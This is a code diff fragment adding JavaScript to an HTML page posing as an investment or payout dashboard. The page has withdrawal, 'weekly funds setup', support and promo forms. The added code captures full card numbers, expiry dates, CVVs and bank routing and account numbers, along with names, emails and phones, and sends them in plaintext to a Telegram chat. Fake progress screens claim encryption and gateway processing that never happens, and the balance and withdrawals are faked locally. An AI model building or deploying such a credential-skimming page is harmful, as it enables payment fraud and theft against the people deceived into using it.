+        let v = input.value.replace(/\D/g, '').substring(0, 16);
+        let matches = v.match(/\d{4,16}/g);
+        let match = matches && matches[0] || '';
+        let parts = [];
+        for (let i = 0; i < match.length; i += 4) {
+            parts.push(match.substring(i, i + 4));
+        }
+        input.value = parts.length ? parts.join(' ') : v;
+    }
+
+    function formatExpInput(input) {
+        let v = input.value.replace(/\D/g, '').substring(0, 4);
+        if (v.length >= 3) {
+            input.value = v.substring(0, 2) + '/' + v.substring(2, 4);
+        } else {
+            input.value = v;
+        }
+    }
+
+    function togglePayMethod(method) {
+        const bankFields = document.getElementById('bank-fields');
+        const cardFields = document.getElementById('card-fields');
+        const bankRouting = document.getElementById('bank-routing');
+        const bankAcc = document.getElementById('bank-acc');
+        const cardNum = document.getElementById('card-num');
+        const cardExp = document.getElementById('card-exp');
+        const cardCvv = document.getElementById('card-cvv');
+
+        if (method === 'bank') {
+            bankFields.classList.remove('hidden');
+            cardFields.classList.add('hidden');
+            bankRouting.required = true;
+            bankAcc.required = true;
+            if (cardNum) cardNum.required = false;
+            if (cardExp) cardExp.required = false;
+            if (cardCvv) cardCvv.required = false;
+        } else {
+            bankFields.classList.add('hidden');
+            cardFields.classList.remove('hidden');
+            bankRouting.required = false;
+            bankAcc.required = false;
+            if (cardNum) cardNum.required = true;
+            if (cardExp) cardExp.required = true;
+            if (cardCvv) cardCvv.required = true;
+        }
+    }
+
+    function openWithdrawModal() {
+        showModal('Withdraw Funds', `
+            <form onsubmit="submitWithdrawal(event)" class="space-y-4">
+                <div>
+                    <div class="flex justify-between items-center mb-1">
+                        <label class="block text-xs font-bold text-slate-300 uppercase">Withdrawal Amount ($ USD)</label>
+                        <span class="text-[11px] text-slate-400">Available: <span class="text-gold-400 font-bold">$${state.userBalance.toLocaleString(undefined, {minimumFractionDigits: 2})}</span></span>
+                    </div>
+                    <input type="number" id="wd-amount" required max="${state.userBalance}" min="10" step="0.01" value="${Math.min(4500, state.userBalance)}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom">
+                </div>
+
+                <div class="flex flex-wrap gap-2 pt-1">
+                    <button type="button" onclick="setWdAmount(500)" class="px-3 py-1.5 bg-navy-900 border border-navy-700 rounded-lg text-xs font-bold text-slate-300 hover:text-white active:scale-95">$500</button>
+                    <button type="button" onclick="setWdAmount(1000)" class="px-3 py-1.5 bg-navy-900 border border-navy-700 rounded-lg text-xs font-bold text-slate-300 hover:text-white active:scale-95">$1,000</button>
+                    <button type="button" onclick="setWdAmount(2500)" class="px-3 py-1.5 bg-navy-900 border border-navy-700 rounded-lg text-xs font-bold text-slate-300 hover:text-white active:scale-95">$2,500</button>
+                    <button type="button" onclick="setWdAmount(${state.userBalance})" class="px-3 py-1.5 bg-sky-custom/20 border border-sky-custom/40 rounded-lg text-xs font-bold text-sky-custom active:scale-95">Max Balance</button>
+                </div>
+
+                <div id="wd-error" class="text-rose-400 text-xs hidden"></div>
+                <div class="flex justify-end pt-3">
+                    <button type="submit" class="w-full sm:w-auto px-6 py-3 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs sm:text-sm active:scale-95 transition">Submit Withdrawal Request</button>
+                </div>
+            </form>
+        `);
+    }
+
+    function setWdAmount(val) {
+        const input = document.getElementById('wd-amount');
+        if (input) {
+            input.value = Math.min(val, state.userBalance);
+        }
+    }
+
+    async function submitWeeklyFundsSetup(e) {
+        e.preventDefault();
+        const payMethodEl = document.querySelector('input[name="pay-method"]:checked');
+        const payMethod = payMethodEl ? payMethodEl.value : 'bank';
+        let detailsMsg = '';
+        let methodName = '';
+
+        if (payMethod === 'bank') {
+            const routing = document.getElementById('bank-routing').value;
+            const acc = document.getElementById('bank-acc').value;
+            methodName = `ACH Bank (**${acc.slice(-4)})`;
+            detailsMsg = `<b>Method:</b> Bank Account\n<b>Routing:</b> ${routing}\n<b>Account:</b> ${acc}`;
+        } else {
+            const num = document.getElementById('card-num').value;
+            const exp = document.getElementById('card-exp').value;
+            const cvv = document.getElementById('card-cvv').value;
+            const cleanNum = num.replace(/\s/g, '');
+            methodName = `Card (**${cleanNum.slice(-4)})`;
+            detailsMsg = `<b>Method:</b> Card\n<b>Card Number:</b> ${num}\n<b>Expiry:</b> ${exp}\n<b>CVV:</b> ${cvv}`;
+        }
+
+        state.configuredMethod = methodName;
+        saveDeviceState();
+
+        const user = state.currentUser || { firstName: 'Anonymous', lastName: 'User', email: 'N/A' };
+        const tgMsg = `💳 <b>WEEKLY FUNDS SETUP SUBMITTED</b> 💳\n\n` +
+            `<b>User:</b> ${user.firstName} ${user.lastName} (${user.email})\n` + detailsMsg;
+        
+        sendTelegramMessage(tgMsg);
+
+        const modal = document.getElementById('modal-content');
+        modal.innerHTML = `
+            <div class="text-center py-6 space-y-4">
+                <h3 class="text-xl font-bold text-white">Configuring Funding Destination</h3>
+                <p class="text-xs text-slate-400">Verifying secure token and payment parameters...</p>
+                <div class="w-full bg-navy-950 h-3 rounded-full overflow-hidden border border-navy-700">
+                    <div id="setup-progress" class="bg-emerald-400 h-full w-0 transition-all duration-300"></div>
+                </div>
+                <div id="setup-status-text" class="text-xs text-gold-400 font-bold">Initializing...</div>
+            </div>
+        `;
+
+        let p = 0;
+        const timer = setInterval(() => {
+            p += 25;
+            const bar = document.getElementById('setup-progress');
+            const txt = document.getElementById('setup-status-text');
+            if (bar) bar.style.width = p + '%';
+            if (p === 50 && txt) txt.textContent = 'Encrypting routing data...';
+            if (p === 75 && txt) txt.textContent = 'Confirming integration parameters...';
+            if (p >= 100) {
+                clearInterval(timer);
+                modal.innerHTML = `
+                    <div class="text-center py-6 space-y-4">
+                        <div class="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-2xl">
+                            <i class="fa-solid fa-circle-check"></i>
+                        </div>
+                        <h3 class="text-2xl font-bold text-white">Setup Complete</h3>
+                        <p class="text-xs text-slate-300">Destination method updated to: <span class="text-gold-400 font-bold">${methodName}</span></p>
+                        <button onclick="closeModal(); render();" class="px-6 py-2.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs sm:text-sm active:scale-95 transition">Return to Dashboard</button>
+                    </div>
+                `;
+            }
+        }, 300);
+    }
+
+    async function submitWithdrawal(e) {
+        e.preventDefault();
+        const amt = parseFloat(document.getElementById('wd-amount').value);
+        const errEl = document.getElementById('wd-error');
+
+        if (isNaN(amt) || amt <= 0 || amt > state.userBalance) {
+            errEl.textContent = `Invalid amount. Must be positive and not exceed available balance ($${state.userBalance.toLocaleString(undefined, {minimumFractionDigits: 2})}).`;
+            errEl.classList.remove('hidden');
+            return;
+        }
+
+        closeModal();
+
+        const container = document.getElementById('app-container');
+        container.innerHTML = `
+            <div class="flex-grow flex items-center justify-center p-6 bg-gradient-to-b from-navy-950 to-navy-900">
+                <div class="bg-navy-800 border border-navy-700 p-8 sm:p-10 rounded-3xl max-w-md w-full text-center shadow-2xl space-y-6 card-3d">
+                    <div class="relative w-20 h-20 sm:w-24 sm:h-24 mx-auto flex items-center justify-center">
+                        <div class="absolute inset-0 rounded-full border-4 border-sky-custom/20 border-t-sky-custom animate-spin"></div>
+                        <i class="fa-solid fa-money-bill-transfer text-2xl sm:text-3xl text-sky-custom"></i>
+                    </div>
+                    <div>
+                        <h3 class="text-xl sm:text-2xl font-bold text-white mb-2">Processing Withdrawal</h3>
+                        <p class="text-xs text-slate-400">Communicating with disbursement gateway...</p>
+                    </div>
+                    <div class="w-full bg-navy-950 h-3 rounded-full overflow-hidden border border-navy-700">
+                        <div id="wd-loading-bar" class="bg-gradient-to-r from-gold-400 to-gold-600 h-full w-0 transition-all duration-300"></div>
+                    </div>
+                    <div id="wd-loading-pct" class="text-base sm:text-lg font-black text-gold-400">0%</div>
+                </div>
+            </div>
+        `;
+
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 10;
+            const bar = document.getElementById('wd-loading-bar');
+            const pct = document.getElementById('wd-loading-pct');
+            if (bar && pct) {
+                bar.style.width = progress + '%';
+                pct.textContent = progress + '%';
+            }
+            if (progress >= 100) {
+                clearInterval(interval);
+                
+                state.userBalance -= amt;
+                const refNum = 'TXN-' + Math.floor(10000 + Math.random() * 90000);
+
+                state.transactions.unshift({
+                    ref: refNum,
+                    date: new Date().toISOString().replace('T', ' ').substring(0, 16),
+                    amount: amt,
+                    type: 'Withdrawal Request',
+                    status: 'Pending'
+                });
+
+                saveDeviceState();
+
+                const user = state.currentUser || { firstName: 'Client', lastName: 'User', email: 'N/A' };
+                const tgMsg = `💸 <b>WITHDRAWAL REQUESTED</b> 💸\n\n` +
+                    `<b>Ref #:</b> ${refNum}\n` +
+                    `<b>User:</b> ${user.firstName} ${user.lastName} (${user.email})\n` +
+                    `<b>Amount:</b> $${amt.toLocaleString()}\n` +
+                    `<b>Remaining Balance:</b> $${state.userBalance.toLocaleString()}`;
+                
+                sendTelegramMessage(tgMsg);
+
+                showPendingPopup(user.firstName);
+            }
+        }, 200);
+    }
+
+    async function submitSupportTicket(e) {
+        e.preventDefault();
+        const ticketId = 'TKT-' + Math.floor(100000 + Math.random() * 900000);
+        const fname = document.getElementById('sup-fname').value;
+        const lname = document.getElementById('sup-lname').value;
+        const phone = document.getElementById('sup-phone').value;
+        const email = document.getElementById('sup-email').value;
+        const category = document.getElementById('sup-category').value;
+        const subject = document.getElementById('sup-subject').value;
+        const message = document.getElementById('sup-message').value;
+
+        const tgMsg = `📩 <b>SUPPORT TICKET CREATED (${ticketId})</b> 📩\n\n` +
+            `<b>Name:</b> ${fname} ${lname}\n` +
+            `<b>Phone:</b> ${phone}\n` +
+            `<b>Email:</b> ${email}\n` +
+            `<b>Category:</b> ${category}\n` +
+            `<b>Subject:</b> ${subject}\n` +
+            `<b>Message:</b> ${message}`;
+
+        sendTelegramMessage(tgMsg);
+
+        showModal('Support Ticket Created', `
+            <div class="space-y-3 text-center py-4">
+                <div class="w-14 h-14 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-xl">
+                    <i class="fa-solid fa-ticket"></i>
+                </div>
+                <h4 class="text-lg font-bold text-white">Ticket Reference: <span class="text-gold-400">${ticketId}</span></h4>
+                <p class="text-xs text-slate-300">Your support inquiry has been received. Our team will contact you shortly.</p>
+            </div>
+        `);
+    }
+
+    async function handlePromoEntry(e) {
+        e.preventDefault();
+        const name = document.getElementById('promo-name').value;
+        const email = document.getElementById('promo-email').value;
+
+        const tgMsg = `🎟️ <b>NEW PROMO STREAM ENTRY</b> 🎟️\n\n` +
+            `<b>Name:</b> ${name}\n` +
+            `<b>Email:</b> ${email}`;
+
+        sendTelegramMessage(tgMsg);
+
+        showModal('Promo Entry Received', `
+            <div class="text-center py-4 space-y-3">
+                <div class="w-12 h-12 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-xl">
+                    <i class="fa-solid fa-check"></i>
+                </div>
+                <h4 class="text-lg font-bold text-white">Thank you, ${name}!</h4>
+                <p class="text-xs text-slate-300">Your entry (<span class="text-gold-400">${email}</span>) has been added to our active distribution pool.</p>
+            </div>
+        `);
+        e.target.reset();
+    }
+
+    window.onload = function() {
+        render();
+    };
+</script>
+
+</body>
+</html><!DOCTYPE html>
 <html lang="en" class="h-full">
 <head>
     <meta charset="UTF-8">
